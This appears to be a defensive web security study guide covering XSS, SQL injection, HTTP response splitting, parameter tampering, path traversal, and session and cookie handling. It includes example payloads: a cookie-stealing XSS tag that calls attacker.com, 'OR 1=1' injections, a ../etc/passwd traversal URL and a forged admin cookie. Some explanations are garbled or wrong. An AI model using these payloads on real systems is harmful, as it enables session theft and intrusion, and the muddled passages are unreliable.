To prevent XSS attacks, data validation must be performed, before input and redisplay (such as output), on all data originating from a source external to the application. This includes data from:

  • The current user

  • Other users

  • All data sources, such as databases and a local file system

The most effective way to prevent XSS attacks is to HTML-encode all dangerous characters before displaying user input within the application pages. This procedure should be performed on all user input, even in the presence of upfront input validation.

In particular, the characters that should be encoded before output are as follows:

“ ‘ : < > ; ( ) / { } @ & +

Note: One of the most common input validation mistakes made for the purpose of preventing XSS is to use a “tag filter” to remove unnecessary “<script>” tags. The examples we’ve seen thus far all have used the “<script>” tag to execute the malicious script, but be careful of assuming this is always the case. Consider the following three XSS examples:

<IMG SRC=’http://www.attacker.com/cookie.asp?cookie=’ + document.cookie’ ”>

<p style=”left:expression(eval(‘alert(document.cookie) ’) ) ” >\u003Cscript\u003E

<SCRIPT> <% = userdata %> </SCRIPT>

The main drawback to using tag filters is that many of the wide array of XSS exploit strategies available do not require the use of “<script>” tags.

SQL Injection:

Consider the following Query:

SELECT firstname, lastname, ssn, email_address FROM users WHERE username = ‘Joe’

In the above query the username is being automatically populated from the user request. Now if, however, the attacker uses a name containing an apostrophe (like O’Conner), he receives an error message similar to the following:

Joe’ OR ‘1’ = ‘1

And considering the loop hole the following malicious statement is built:

SELECT firstname, lastname, ssn, email_address FROM users WHERE username = ‘Joe’ OR ‘1’ = ‘1

Hence, the use of the string building or concatenation to create dynamic SQL statements should be avoided to prevent SQL injection attacks.

As a result of this formatting, the exploit had to strategically use the injected single quotes to create a syntactically valid SL statement. In our SQL statement using the “acctnum” parameter, the user-supplied value is not delimited using strings. To perfrom an injection on this query, an attacker can simply append arbitrary SQL statements to the end of the “acctnum” input.

If the user enters 1234%20OR%201=1 in the “acctnum” parameter, the following malicious statement is constructed:

SELECT cc_num, cc_exp FROM credit_cards WHERE acctnum = 1234 OR 1=1

The first line of defense is to perform validation using the known Good Validation for all input used in SQL queries. If the Data is zip code then validation should be performed to verify that the data contains only numbers and has exact five digits.

The second step in the process is to implement parameterized queries such as PreparedStatement and CallableStatement interfaces (J2EE)

The third step in the defense against SQL injection is to centralize all the database access into stored procedures. Stored procedures allow the database permissions to be restricted to execute privileges on only the relevant stored procedures.

Stack – (run-time stack) the stack’s primary purpose is to make the use of functions more efficient. The stack consists of logical frames that are created when calling a function and removed when returning. A stack frame contains the parameters to a function, its logical variables, and the data necessary to recover the previous stack frame. This section operates as a traditional LIFO (last-in-first-out) queue, and it grows downwards such that the top of stack is toward the bottom of the memory.

Heap – Used for data that is dynamically allocated during run-time by the process (e.g., malloc). This structure grows upward toward higher memory addresses.

Data – This segment is read-only; it is used for storing fixed-size static data (e.g., static and final global variables).

Code – This segement is also read-only; it contains the program instructions from the executable file.

When a function must be interrupted, the following actions are carried out in order:

  1. Place the function’s arguments on the stack (argv[1])

  2. Store the return address (RET) on the stack. The return address is the location at which to continue execution when StorePassword has exited. In this example, the address of the printf(“Password Stored”); instruction will be stored.

  3. Store the base pointer (EBP) on the stack. The EBP value is used for calculating the addresses of instructions in the main function once we return to it.

  4. Finally, store the variables local to StorePassword on the stack, (passwd[])

HTTP Response Splitting:

The essence of HTTP response splitting is the attacker’s ability to send a single HTTP request that forces the web server to form an output stream, which is then interpreted by the trarget as to two HTTP responses instead of one response. The first response may be partially controlled by the attacker, but this is less important. The attacker controls the form of the second response from the HTTP status line to the last byte of the HTTP response body and typically takes the form of an “innocent” resource on the web server. By controlling the second response, the attacker tricks the target into believing that a particular resource on the web server (designated by the second request) is the server’s HTTP response (server content), while it is in fact some data that is captured by the attacker through the Web server.

HTTP response splitting is a type of attack that is similar in nature to cross site scripting.

In this case, the attacker is targeting local (client-based) and remote (proxy-based) caching devices. HTTP response splitting vulnerabilities occur when the application embeds un-validated user-supplied data inside the HTTP response headers that are returned to the client browsers. HTTP headers themselves are used to provide meta-information (e.g., set cookies, cacheability, redirection location) about the ensuing HTTP response. Allowing an attacker to control the content of HTTP headers that will ultimately be returned to the client browsers exposes the application to numerous types of cache poisoning attacks.

What causes this behavior? The answer lies in the HTTP specifications detailed in RFC 2616; from this we know that the HTTP protocol has defined the sequence “CR LF” (i.e., the newline) as the end-of-line marker for all protocol elements. If an attacker can control content that will be used in the headers, then he or she can inject CRLF sequences to generate syntactically valid HTTP protocol elements and alter the apparent behavior of the web server. In our example, the attacker has inserted data in the “URL” parameter that mimics the content of a second HTTP response containing the simple HTML page indicated by <html>Nothing</html>

When evaluating the impact of an HTTP response splitting attack, it is helpful to visualize the attack scenario. In the diagram below, the attacker will stage his attack by making two HTTP requests in rapid succession. The two requests have these characteristics:

  • Request A contains the attacker’s HTTP response splitting exploit.

  • Request B asks for legitimate content, such as index.html.

The Internet-facing Web cache receives these requests and forwards them along to the web server.

As we can see below, when the web server responds, things get interesting. The response stream corresponding to Request A is interpreted by Web Cache as two completely separate HTTP responses (shown as A1 and A2). The caching device will accept the first two HTTP responses available and pair them with its original two requests. The pairings will resemble the following:

  • Request A will be paired with Response A1.

  • Request B will be paired with Response A2.

Response B will be ignored because it does not correspond to a known request.

The attacker hence has successfully caused the Web caching device to improperly match the request/response pairs. Any user who subsequently requests the same content as request B (i.e., index.html) will be served with the “poisoned” cached result.

The most restrictive input validation method possible should be used to avoid accepting unnecessary characters. Validation must be performed on any data that will be embedded into HTTP in case of:

  • Setting the Cookies

  • Redirection (HTTP 3xx)

  • Setting MIME types, content type, file size

  • Custom headers

If the input will be dynamic, then the following validation should be performed at a minimum:

  • Remove carriage return (CR, ASCII code 13) and line feed (LF, ASCII code 10) characters from data embedded into the HTTP response headers.

  • Input filters should avoid accepting non-ASCII characters

Hence, the proper way to defend against HTTP response splitting attacks is to:

  • Limit your input by rejecting non-ASCII characters

  • Further reject any CR and LF characters

Application Misbehavior:

Fundamentally, web applications interact with their users by sending and receiving various types of parameters. These parameters can represent any piece of mutable data within the application including the user’s name, bank account number, privilege level, or search keywords. When the parameters used to hold user controllable data are not properly validated, the application is at risk to attack via parameter manipulation resulting in a wide range of misbehaviors.

One of the most prominent points to grasp is that user controllable data can come from many different locations:

  • HTTP cookies

  • Hidden HTML form fields

  • Query strings in HTTP GET requests

  • Data in HTTP POST request

  • HTTP headers

Any information passed to the Web Browser via one of the methods listed above exposes that data to modification. If the application fails to properly validate the data upon return, attackers can execute various types of information gathering exploits to profile how the application operates.

The most effective defense against application misbehavior is to validate all assumptions about user-supplied data, including:

  • Type

  • Format

  • Length

Sample malicious requests:

User-Agent: Mozilla/4.0

Host: www.example.com

Cookie: PRIV=; SESSIONID=2KDSU72H9GSA289

GET /admin.aspx HTTP/1.0

User-Agent: Mozilla/4.0

Host: www.example.com

Cookie: PRIV=ADMIN; SESSIONID=2KDSU72H9GSA289

Forceful Browsing:

Forceful browsing is a method of guessing a web page addresses by manipulating the URL line instead of clicking on a hyperlink. In case a report is generated in web folder dynamically on the fly, it can be accessed by an attacker using forceful browsing which does not require special skills or tools. The poor choice of temporary filename is as follows:

  • Incremental (100.pdf, 101.pdf, 102.pdf)

  • Only user account number (000012345678.pdf, 542763153.pdf, etc.)

  • Social Security Number (999-99-9999.pdf, etc.)

  • Company + Report Name (Expense-report.pdf etc.)

With incremental temporary filename the attacker can simply predict the next files/reports present in the Web folder and try to access them. Also with the account number and social security the attacker can search for known SSN and account numbers or use trial and error to find matching reports which may be present. Also from proper report names helps the attacker to guess other probable report names such as from Expense-report.pdf he can try Accounts-report.pdf etc.

Assuming the remote computer is a Unix-like computer, the user list will be located in the /etc/passwd file. Also, since “/” is not a valid URL character, %2F will be translated back to “/” but will be sent as %2F on the URL. The following URL is formatted in a way as to fool the application into looking at the “passwd” file instead of the file requested:

http://www.example.com/mgr.asp?action=viewfile&file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

To protect against such attack, the server must validate filenames are “safe” by searching for use of “..” or other substitutions.

Access controls will be very specific – or in fact, too specific in Windows esp – and where a file such as “Secret File.doc” may be locked from being accessed but the file “Secret~1.doc” will be approved.

Also by using the technique of “Path Truncation” were the actual path is substituted by a mapped short URL. Hence due to the shorter pathname the effort/time to guess where other information is located, given the evidence increases.

 

Session Control:

Displaying the session information in a URL is not considered professional and is considered a high risk. Such session information can be accessed or traced by the attacker and used to login or get customer information. The programmer must try to display the least amount of information as possible in the URL line while minimizing the amount of sensitive information stored at the browser. Remember borwser’s can be compromised by various attacks such as cross site scripting and transferring browser data to remote machine.

Set-cookie: sessionid=1231241241451343242; expires=Thursday, 10-AUG-2006 12:32:58 GMT

Cookies should never be used as a method for timing out sessions unless this “in addition to” one of the other techniques used to time out sessions.

 

Session ID:

The following variables must never be passed by a form or through the URL unless through a secure channel such as HTTPS:

  • User Name

  • User ID

  • User Contact Information

  • Password

  • Account Number (Unique ID Number)

  • Computer Name

  • Server Name

  • IP Addresses

The Server should not trust the information delivered by the browser without verifying its authenticity. Likewise, storing information such as passwords, credit card numbers, social security numbers and other highly sensitive information should never be done using cookies. These are easy targets for gathering information.

A stronger system can often be created by limiting the session ID to association with only one IP address. However, many firewalls currently divide communications among multiple databases.

Session ID should always be a large random number which is harder to predict. While picking a random number, consider these sources for a seed:

  • Time and Date

  • Hard drive space

  • Packets sent by the server

  • Total transaction by the database

  • Previous random number

The following can be easily forged:

  • Browser ID

  • URL

  • Cookies

  • Acceptable communications (MIME-types, compression, encryptions)

Information that cannot be guaranteed accurate when establishing a session:

  • User has a single IP address

  • User has a domain name

 

Cookies:

Cookie is the information stored by the browser from the server primarily to maintain the state information. The cookie is sent to the server by the browser to indicate the client state to the server. The cookie is sent to the server in a raw form by the browser:

GET /changecompany.php?newcompany=ABC.%20Inc HTTP-COOKIE: myname=John Q. Public HTTP-COOKIE: organization=Acme, LLC. <CR>

The assumption is that there is an actual web browser communicating to the server is also not guaranteed as there could be a man in the middle attacks.

The following information should not be stored in a cookie and or trusted by the server:

  • User Account Information

  • Access Persmissions

  • User Details (real name, email address, etc.)

  • IP Address

  • Access Time

 

Another common mistake is not making the same validation checks on information provided by cookies as on would on a URL.

Cross-Frame Scripting:

Cross-Frame Scripting is a form of attack that takes place between frames on a multi-frame web page. Each frame is actually a unique HTML document that works independently of one another and each can have their own URL. In order to connect the events of the frames, it is possible to associate events in one frame to report to event handlers in a different frame.
